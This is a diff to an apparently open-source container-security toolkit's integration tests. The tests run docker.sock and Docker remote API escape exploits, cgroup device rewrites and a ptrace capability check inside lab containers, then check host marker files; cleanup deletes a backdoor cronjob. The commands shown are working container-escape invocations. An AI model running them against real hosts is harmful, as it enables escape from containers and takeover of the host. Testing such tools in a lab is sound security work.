@@ -256,34 +256,6 @@ def test_container():
     inside_container_cmd(
         image='ubuntu:latest',
         docker_args='',
-        cmd=r'run docker-sock-deploy',  # " needs to escape in raw
-        white_list=['invalid input args'],
-        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
-        verbose=False
-    )
-    inside_container_cmd(
-        image='ubuntu:latest',
-        docker_args='',
-        cmd=r'run docker-sock-deploy /var/run/docker.sock alpine:latest',  # " needs to escape in raw
-        white_list=['no such file or directory'],
-        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
-        verbose=False
-    )
-    inside_container_cmd(
-        image='ubuntu:latest',
-        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
-        cmd=r'run docker-sock-deploy /var/run/docker.sock alpine:latest',  # " needs to escape in raw
-        white_list=['success', 'happy escaping', 'alpine:latest', '"ID"', 'starting container:', 'finished'],
-        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],
-        verbose=False
-    )
-    time.sleep(1)
-    check_host_exec('docker ps | grep alpine', ['alpine'], [], False)
-
-    # exploit: docker-sock-check (will leave a container with image alpine:latest)
-    inside_container_cmd(
-        image='ubuntu:latest',
-        docker_args='',
         cmd=r'run mount-cgroup',  # " needs to escape in raw
         white_list=['invalid input args'],
         black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
@@ -407,10 +379,70 @@ def test_container():
         image='ubuntu:latest',
         docker_args='--privileged=true',
         cmd=r'run rewrite-cgroup-devices',  # " needs to escape in raw
-        white_list=['cdk_mknod_result','debugfs'],
+        white_list=['cdk_mknod_result', 'debugfs'],
         black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],
         verbose=False
     )
+
+    # run: check-ptrace
+    inside_container_cmd(
+        image='ubuntu:latest',
+        docker_args='',
+        cmd='run check-ptrace',
+        white_list=['SYS_PTRACE capability was disabled'],
+        black_list=[],
+        verbose=False
+    )
+    inside_container_cmd(
+        image='ubuntu:latest',
+        docker_args='--cap-add=SYS_PTRACE',
+        cmd='run check-ptrace',
+        white_list=['SYS_PTRACE capability was enabled', 'root'],
+        black_list=[],
+        verbose=False
+    )
+
+    # tool: dcurl
+    check_host_exec(r'/root/cdk-fabric dcurl get http://127.0.0.1:2375/info ""', ['ContainersRunning'], [], False)
+
+    # run: docker-api-pwn
+    check_host_exec(
+        r'/root/cdk-fabric run docker-api-pwn http://127.0.0.1:2375 "touch /host/tmp/docker-api-pwn"',
+        ['Pulling', 'starting', 'finished'],
+        [],
+        False
+    )
+    time.sleep(1)
+    check_host_exec('ls /tmp/docker-api-pwn', ['docker-api-pwn'], [], False)
+
+    # exploit: docker-sock-pwn
+    inside_container_cmd(
+        image='ubuntu:latest',
+        docker_args='',
+        cmd=r'run docker-sock-pwn',  # " needs to escape in raw
+        white_list=['invalid input args'],
+        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
+        verbose=False
+    )
+    inside_container_cmd(
+        image='ubuntu:latest',
+        docker_args='',
+        cmd=r'run docker-sock-pwn /var/run/docker.sock "touch /tmp/docker-sock-pwn"',  # " needs to escape in raw
+        white_list=['no such file or directory'],
+        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
+        verbose=False
+    )
+    inside_container_cmd(
+        image='ubuntu:latest',
+        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
+        cmd=r'run docker-sock-pwn /var/run/docker.sock "touch /tmp/docker-sock-pwn"',  # " needs to escape in raw
+        white_list=['success', 'happy escaping', 'alpine:latest', '"ID"', 'starting container:', 'finished'],
+        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],
+        verbose=False
+    )
+    time.sleep(1)
+    check_host_exec('ls /tmp/docker-sock-pwn', ['docker-sock-pwn'], [], False)
+
 
 def test_pod():
     # evaluate in K8s
@@ -608,11 +640,6 @@ def test_pod():
     )
 
 
-def test_dev():
-    time.sleep(0.5)
-
-
-
 def clear_all_env():
     k8s_master_ssh_cmd(
         'kubectl delete cronjob cdk-backdoor-cronjob -n kube-system',
@@ -639,6 +666,12 @@ def clear_all_env():
         False
     )
     check_host_exec(r'docker stop $(docker ps -q) & docker rm $(docker ps -aq)', [], [], False)
+    check_host_exec(r'rm /tmp/docker-api-pwn', [], [], False)
+    check_host_exec(r'rm /tmp/docker-sock-pwn', [], [], False)
+
+
+def test_dev():
+    time.sleep(0.5)
 
 
 if __name__ == '__main__':
